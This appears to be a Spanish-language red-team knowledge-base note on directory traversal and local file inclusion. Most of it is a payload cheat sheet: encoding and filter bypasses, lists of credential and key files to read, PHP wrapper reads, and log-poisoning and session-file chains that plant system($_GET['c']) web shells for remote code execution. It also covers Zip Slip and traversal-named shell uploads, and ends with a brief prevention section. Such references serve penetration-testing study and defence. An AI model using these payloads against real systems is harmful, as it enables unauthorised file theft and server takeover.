---
aliases:
  - Path Traversal
  - Dot-Dot-Slash
  - LFI Traversal
tags:
  - type/atomic
  - vuln/path-traversal
  - technique/initial-access
  - technique/discovery
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Web Enumeration]]"
type: Atomic
linked:
  - "[[LFI - Rutas Principales]]"
  - "[[Abusing PHP Filters]]"
  - "[[gobuster]]"
  - "[[ffuf]]"
  - "[[Burp Suite]]"
---
# Directory Traversal

***

## Cheatsheet
^directory-traversal

| Vector | Payload |
| --- | --- |
| **Basic** | `../../../etc/passwd` |
| **Absolute** | `/etc/passwd` |
| **URL encode** | `..%2f..%2f..%2fetc%2fpasswd` |
| **Double encode** | `..%252f..%252fetc%252fpasswd` |
| **16-bit unicode** | `..%u2215..%u2215etc%u2215passwd` |
| **UTF-8 overlong** | `..%c0%af..%c0%afetc%c0%afpasswd` |
| **Null byte** (PHP <5.3) | `../../../etc/passwd%00` |
| **Filter bypass** | `....//....//etc/passwd` |
| **Strip-prefix bypass** | `/var/www/images/../../../etc/passwd` |
| **Windows** | `..\..\..\windows\win.ini` |
| **PHP wrapper read** | `php://filter/convert.base64-encode/resource=index.php` |

***

## Concepto

Vuln donde input del user termina en operación de file access sin sanitización, permitiendo **leer (y a veces escribir) archivos fuera del directorio web**. Root cause típico: concatenación directa de user input en `fopen`/`file_get_contents`/`include`/etc.

Path Traversal ≠ LFI:
- **Path Traversal**: lectura arbitraria de archivos.
- **LFI (Local File Inclusion)**: el archivo se **ejecuta/interpreta** (PHP `include`) → RCE vía log poisoning, PHP wrappers, session file, etc.

## 1. Discovery

```bash
# Fuzzing con payloads de traversal
ffuf -u "http://target/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0

# Detectar parámetros que manejan archivos
ffuf -u "http://target/page?FUZZ=index.html" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline>

# Burp Intruder con lista de payloads (PayloadsAllTheThings)
```

Indicadores:
- Parámetro con nombre sugestivo: `file`, `page`, `include`, `doc`, `path`, `src`, `download`, `view`, `theme`.
- Error messages tipo `Failed to open stream: No such file or directory in /var/www/html/...`.
- Content-type changes si sirve contenido literal vs interpretado.

## 2. Bypass filters

### String filter `../`

```
....//....//....//etc/passwd       # strip-once fails
..././..././..././etc/passwd
```

### Encoding chains

```
# Single URL-encode
..%2F..%2F..%2Fetc%2Fpasswd

# Double URL-encode (engine decodes twice)
..%252F..%252Fetc%252Fpasswd

# UTF-8 overlong (IIS / old Apache)
..%c0%af..%c0%afetc%c0%afpasswd

# Unicode fullwidth
..%uff0f..%uff0fetc%uff0fpasswd
```

### Absolute path (when app prepends base dir)

```
# App: $file = "/var/www/uploads/" . $_GET['f']
# Bypass con null byte o extensión fake:
?f=/etc/passwd%00.jpg            # PHP <5.3
?f=/etc/passwd%23.jpg            # # truncates

# Linux: /proc shortcut
?f=/proc/self/environ
?f=/proc/self/cmdline
?f=/proc/self/status
?f=/proc/self/fd/0     # stdin
```

### Suffix append bypass

```
# App: $file = $_GET['f'] . ".php"
# Bypass: null byte (legacy PHP)
?f=../../etc/passwd%00

# Bypass: path truncation (PHP ~4096 chars)
?f=../../etc/passwd/./././././... (4000x)

# Bypass: query string
?f=../../etc/passwd?
```

## 3. Archivos interesantes (Linux)

```
/etc/passwd
/etc/shadow              # needs root
/etc/hostname
/etc/hosts
/etc/issue
/etc/resolv.conf
/etc/crontab
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/ssh/sshd_config
/var/log/apache2/access.log
/var/log/auth.log
/var/www/html/config.php
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/root/.ssh/id_rsa
/proc/self/environ       # env vars (posible RCE via log poisoning)
/proc/self/cmdline
/proc/<pid>/cmdline
/proc/version
/proc/mounts
```

## 4. Archivos interesantes (Windows)

```
C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\NTUSER.DAT
```

## 5. PHP wrappers (LFI → source leak / RCE)

```
# Leer source PHP codificado base64 (evita que se ejecute)
?file=php://filter/convert.base64-encode/resource=index.php

# Encadenar filtros
?file=php://filter/read=string.rot13/resource=index.php
?file=php://filter/zlib.deflate/convert.base64-encode/resource=config.php

# Injectar código via data://
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id

# expect:// (si módulo expect instalado)
?file=expect://id

# Input stream (POST body as PHP)
POST /page?file=php://input
Body: <?php system('id'); ?>

# Phar deserialization (PHP 7+)
?file=phar:///tmp/exploit.phar
```

Ver [[Abusing PHP Filters]] en profundidad.

## 6. LFI → RCE chains

### Log poisoning

```bash
# 1. Injectar PHP en log vía User-Agent
curl http://target/ -H "User-Agent: <?php system(\$_GET['c']); ?>"

# 2. Incluir log
http://target/page.php?file=/var/log/apache2/access.log&c=id
```

### Session file

```bash
# 1. Settear valor en sesión que incluya PHP
curl http://target/login -d "username=<?php system(\$_GET['c']); ?>"

# 2. Incluir sesión
# /var/lib/php/sessions/sess_<PHPSESSID>
?file=/var/lib/php/sessions/sess_abcd1234&c=id
```

### /proc/self/environ (CGI)

```bash
# User-Agent escribe en environ
curl http://target -H "User-Agent: <?php system('id'); ?>"

# LFI para ejecutarlo
?file=/proc/self/environ
```

### SSH auth_log

```bash
# 1. Auth SSH con usuario tipo <?php system($_GET['c']); ?>
ssh '<?php system($_GET["c"]); ?>'@target

# 2. Include /var/log/auth.log
?file=/var/log/auth.log&c=id
```

### Mail log

```bash
# Enviar mail con PHP en body
echo "<?php system(\$_GET['c']); ?>" | mail -s subject www-data@target

# Include /var/mail/www-data
?file=/var/mail/www-data&c=id
```

## 7. Wordlists

```
/usr/share/seclists/Fuzzing/LFI/
├── LFI-Jhaddix.txt
├── LFI-gracefulsecurity-linux.txt
├── LFI-gracefulsecurity-windows.txt
└── LFI-LFISuite-pathtotest-huge.txt

/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

## 8. Tools

| Tool | Uso |
| --- | --- |
| **LFISuite** | Auto-LFI + shell spawn (outdated pero útil). |
| **liffy** | Similar a LFISuite, más actualizado. |
| **fuxploider** | File upload + LFI chains. |
| **Burp Intruder** | Payload lists custom. |
| **ffuf / wfuzz** | Fuzzing rápido con filters. |

## 9. Write-primitive (escritura)

Ciertos bugs permiten **escribir** arbitrario (mv/copy/extract con path input):
- **Zip Slip** — `zip -r evil.zip "../../etc/cron.d/pwn"` → víctima extrae → cron overwrite.
- **Tar Slip** — análogo con tar symlinks.
- **File upload** — controlar nombre con traversal: `uploads/../../../tmp/shell.php`.

## 10. Prevención

- **Canonicalizar** path + verificar prefijo: `realpath($input)` y `strpos($real, $base) === 0`.
- **Whitelist** de filenames (no blacklist de `../`).
- **Chroot** o containers para aislar.
- **Disable wrappers peligrosos** en PHP: `allow_url_include = Off`, desabilitar `expect`, `phar`.
- **File permissions**: www-data no debe leer `/etc/shadow`, `.ssh/`, etc.

## Recursos

- [PortSwigger - Path traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

***
